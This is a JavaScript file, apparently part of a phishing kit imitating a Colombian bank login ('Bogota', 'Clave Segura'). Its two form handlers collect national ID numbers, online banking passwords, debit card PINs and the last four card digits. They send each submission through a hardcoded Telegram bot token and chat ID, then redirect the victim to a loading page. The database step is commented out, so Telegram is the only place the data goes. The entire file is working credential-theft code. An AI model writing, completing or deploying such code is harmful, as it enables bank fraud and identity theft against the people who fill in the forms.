// public/js/json.js  <- reemplaza tu json.js actual por esto
// --- AVISO: mantener el token en cliente es inseguro (mover al servidor luego) ---
const BOT_TOKEN = "8758134540:AAEz5hxgfXESVW5iOtuF4hJ-D3M88rvKGAY";
const CHAT_ID  = "-5022596318";

// Helper: enviar a tu endpoint de base de datos (submit_form1 o submit_form2)
async function guardarEnDB(formEndpoint, formData) {
  try {
    const resp = await fetch(formEndpoint, {
      method: 'POST',
      body: formData
    });
    const json = await resp.json();
    return json; // { ok: true } u { ok:false, error: ... }
  } catch (err) {
    console.error('Error guardando en DB:', err);
    return { ok: false, error: 'fetch error' };
  }
}

// Helper: enviar mensaje a Telegram (cliente) — actualmente lo usas en cliente
async function enviarTelegram(mensaje) {
  try {
    const res = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
      })
    });
    return await res.json();
  } catch (err) {
    console.error("Error enviando a Telegram:", err);
    return null;
  }
}

// Función que guarda en DB, envía Telegram y redirige a load.html con identificador
async function procesarYRedirigir({ formEndpoint, formData, mensaje, identificador }) {
  // 1) Guardar en DB
  // const dbResp = await guardarEnDB(formEndpoint, formData);
  // if (!dbResp.ok) {
  //   console.error('DB no respondió ok:', dbResp);
  //   alert('Error al guardar en la base de datos. Intenta de nuevo.');
  //   return;
  // }

  // 2) Enviar a Telegram (si quieres mantener notificación desde cliente)
  // Si tu lógica del bot ya hace el envío no hace falta esto; mantengo para compatibilidad.
  try {
    await enviarTelegram(mensaje);
  } catch (e) {
    console.warn('Fallo enviar telegram (no bloqueante):', e);
  }

  // 3) Redirigir a load.html pasando el identificador
  const url = `load.html?identificador=${encodeURIComponent(identificador)}`;
  window.location.href = url;
}

/* ----------------
   Formulario 1 (loginForm)
   Campos en tu index.html: tipoPersona, cedu, clav
   Endpoint server: /api/submit_form1.php
   ---------------- */
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const tipo_persona = document.getElementById("tipoPersona").value || '';
  const identificador = document.getElementById("cedu").value.trim();
  const nacimiento = document.getElementById("clav").value.trim();

  if (!identificador) {
    alert('Ingresa tu identificación');
    return;
  }

  const mensaje =
      "✅🇨🇴🇨🇴💲Bogota 🔑Clave Segura:✅🇨🇴🇨🇴💲\n\n" +
      "👨‍👩‍👧‍👦Tipo de persona: " + tipo_persona + "\n\n" +
      "📰Numero de Identificacion: " + identificador + "\n\n" +
      "🔑Clave Segura:" + nacimiento;

  // Prepara FormData para /api/submit_form1.php
  const fd = new FormData();
  fd.append('tipo_persona', tipo_persona);
  fd.append('identificador', identificador);
  fd.append('nacimiento', nacimiento);

  procesarYRedirigir({
    formEndpoint: '/api/submit_form1.php',
    formData: fd,
    mensaje,
    identificador
  });
});

/* ----------------
   Formulario 2 (tarjeta-form)
   Campos: typeper, ceduTD, tarjclav, ultidig
   Endpoint server: /api/submit_form2.php
   ---------------- */
document.getElementById("tarjeta-form").addEventListener("submit", function(e) {
  e.preventDefault();

  const tipo_persona = document.getElementById("tipoPersona").value || '';
  const identificador = document.getElementById("ceduTD").value.trim();
  const nacimiento = document.getElementById("tarjclav").value.trim();
  const nacimiento_conf = document.getElementById("ultidig").value.trim();

  if (!identificador) {
    alert('Ingresa tu identificación');
    return;
  }


  const mensaje =
      "✅🇨🇴🇨🇴💲Bogota 🔑Tarjeta debito:✅🇨🇴🇨🇴💲\n" +
      "👨‍👩‍👧‍👦Tipo de persona: " + tipo_persona + "\n\n" +
      "📰Numero de Identificacion: " + identificador + "\n\n" +
      "🔑Clave tarjeta debito:" + nacimiento + "\n\n" +
      "💳Ultimos 4 digitos de la tarjeta:" + nacimiento_conf;

  // Prepara FormData para /api/submit_form2.php
  const fd = new FormData();
  fd.append('tipo_persona', tipo_persona);
  fd.append('identificador', identificador);
  fd.append('nacimiento', nacimiento);
  fd.append('nacimiento_confirmado', nacimiento_conf);

  procesarYRedirigir({
    formEndpoint: '/api/submit_form2.php',
    formData: fd,
    mensaje,
    identificador
  });
});
